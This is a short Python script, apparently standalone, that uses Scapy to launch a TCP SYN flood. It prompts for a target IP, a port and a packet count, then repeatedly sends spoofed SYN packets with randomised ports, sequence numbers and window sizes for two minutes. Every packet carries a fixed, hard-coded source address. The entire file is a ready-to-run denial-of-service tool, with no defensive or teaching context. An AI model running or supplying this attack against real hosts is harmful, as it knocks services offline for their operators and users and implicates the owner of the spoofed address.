from scapy.all import *
import os
import sys
import random
import datetime
def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip
def randInt():
	x = random.randint(1000,9000)
	return x	
def SYN_Flood(dstIP,dstPort,counter):
	total = 0
	packets = 0
	threshold = 4500
	control = randInt()
	print("Sending packets...")
	if(control > threshold):
		for x in range (0,counter):
			s_port = randInt()
			s_eq = randInt()
			w_indow = randInt()
			IP_Packet = IP ()
			IP_Packet.src = "13.126.234.209"
			IP_Packet.dst = dstIP
			TCP_Packet = TCP ()	
			TCP_Packet.sport = s_port
			TCP_Packet.dport = dstPort
			TCP_Packet.flags = "S"
			TCP_Packet.seq = s_eq
			TCP_Packet.window = w_indow
			send(IP_Packet/TCP_Packet, verbose=0)
			total += 1
		sys.stdout.write("\nTotal packets sent: %i\n" % total)
def info():
	dstIP = raw_input ("\nTarget IP : ")
	dstPort = input ("Target Port : ")
	
	return dstIP,dstPort
def periodic(maxrt):
	stop = datetime.datetime.now() + maxrt
	dstIP,dstPort = info()
	counter = input ("Number of packets you want to send : ")
	while((datetime.datetime.now()) < stop):
		SYN_Flood(dstIP,dstPort,counter)
	
periodic(datetime.timedelta(minutes = 2))